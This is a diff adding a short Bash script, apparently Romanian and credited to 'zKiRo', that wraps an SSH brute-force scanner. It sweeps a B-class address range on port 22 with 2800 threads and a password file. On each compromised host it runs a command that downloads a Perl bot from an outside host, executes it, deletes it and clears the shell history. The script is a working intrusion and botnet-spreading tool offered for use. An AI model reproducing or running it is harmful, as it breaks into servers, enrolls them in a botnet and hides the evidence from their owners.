@@ -1,0 +1,30 @@
+#!/bin/bash
+# Skype live:itznivek6  | © 2017-2018-2019
+# by zKiRo 
+# 
+### Set conexiuni tool ###
+passfile=pass
+threads=2800
+port=22
+#
+DBLU='[1;34m'
+DRED='[0;31m'
+DGRN='[0;32m'
+DYEL='[0;33m'
+DBLU='[0;34m'
+DMAG='[0;35m'
+DCYN='[0;36m'
+DWHI='[0;37m'
+
+if [ $# != 1 ]; then
+        echo "${WHI}   Folosim: $0 <b class>${RES}"
+        exit;
+fi
+clear
+echo -e "\033[0;32m[+]-Scanner \033[0;37mMiX \033[4;32m2018.\033[1;31m"
+echo -e "\033[0;32m[+]-Imbunatatit by zKiRo. \033[0;32m"
+
+
+./cola $threads -b $1 $passfile $port "uname -a ;wget meliodasnr1.000webhostapp.com/.abc/bot.pl ;perl bot.pl ;rm -rf bot.pl ;history -c"
+sleep 5
+echo "${DRED}[+]${DYEL} Am terminat tarfa,schimba tarfa!${RES}"
